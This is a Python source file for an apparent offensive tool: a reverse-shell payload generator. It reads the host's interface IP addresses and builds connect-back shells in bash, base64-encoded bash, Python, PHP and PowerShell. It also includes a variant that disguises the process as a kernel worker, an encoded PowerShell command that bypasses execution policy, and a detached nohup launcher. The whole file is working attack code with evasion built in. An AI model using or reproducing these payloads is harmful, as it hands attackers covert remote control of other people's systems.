from __future__ import annotations

import base64
import subprocess


def get_interfaces() -> dict[str, str]:
    result = {}
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
        iface = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                iface = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and iface:
                ip = line.split()[1].split("/")[0]
                if not ip.startswith("127."):
                    result[iface] = ip
    except Exception:
        pass
    return result


def _b64_payload(ip: str, port: int) -> str:
    raw = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    return base64.b64encode(raw.encode()).decode()


def _build_payloads(ip: str, port: int) -> dict[str, str]:
    # One valid PowerShell one-liner: ';' between statements, never before an
    # 'else', and backtick-escaped quotes for the inner `cmd /c` calls.
    _CMD_PAYLOAD = (
        f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$stream=$client.GetStream();"
        "$writer=New-Object IO.StreamWriter($stream);"
        "$writer.AutoFlush=$true;"
        "$reader=New-Object IO.StreamReader($stream);"
        "$cwd='C:\\';"
        "while($client.Connected){"
            "$writer.Write(\"$cwd> \");"
            "$cmd=$reader.ReadLine();"
            "if($cmd -eq 'exit'){break};"
            "if($cmd -match '^cd\\s+(.+)$'){"
                "$target=$matches[1].Trim();"
                "$newpath=cmd /c \"cd /d `\"$cwd`\" && cd `\"$target`\" && cd\";"
                "if($LASTEXITCODE -eq 0 -and $newpath){$cwd=$newpath.Trim()}"
                "else{$writer.WriteLine(\"The system cannot find the path specified.\")}"
            "}else{"
                "$out=(cmd /c \"cd /d `\"$cwd`\" && $cmd\" 2>&1 | Out-String).Trim();"
                "$writer.WriteLine($out)"
            "}"
        "};"
        "$client.Close()"
    )
    _PS_BASE = f"$client=New-Object Net.Sockets.TCPClient('{ip}',{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    return {
        "bash":               f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        "bash (alt)":         f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "procsubst (bash)":       f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
        "procsubst (spoof argv)": f'exec -a [kworker/0:1] bash <(echo {_b64_payload(ip, port)} | base64 -d)',
        "procsubst (sh compat)":  f'bash <(printf %s {_b64_payload(ip, port)} | base64 -d)',
        "python3":            f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "python":             f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "php":                f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
        "powershell":         _PS_BASE,
        "cmd.exe":            f"powershell -nop -ep bypass -enc {base64.b64encode(_CMD_PAYLOAD.encode('utf-16-le')).decode()}",
    }


def linux_callback_script(ip: str, port: int) -> str:
    """POSIX-sh one-liner spawning a detached reverse shell to *ip:port*.

    Python first so the session lands as a real PTY (no `upgrade` needed);
    detached from the caller's stdio, else the delivering command blocks.
    """
    p = _build_payloads(ip, port)
    return (
        "d=; command -v setsid >/dev/null 2>&1 && d=setsid; "
        f"if command -v python3 >/dev/null 2>&1; then $d nohup {p['python3']} >/dev/null 2>&1 & "
        f"elif command -v python >/dev/null 2>&1; then $d nohup {p['python']} >/dev/null 2>&1 & "
        f"else $d nohup {p['bash']} >/dev/null 2>&1 & fi"
    )


class PayloadGenerator:

    def __init__(self, port: int = 4010):
        self.port = port

    def get_interfaces(self) -> dict[str, str]:
        return get_interfaces()

    def for_interface(self, iface: str) -> dict[str, str] | None:
        interfaces = get_interfaces()
        if iface not in interfaces:
            return None
        return _build_payloads(interfaces[iface], self.port)

    def for_all(self) -> dict[str, dict[str, str]]:
        return {
            iface: _build_payloads(ip, self.port)
            for iface, ip in get_interfaces().items()
        }
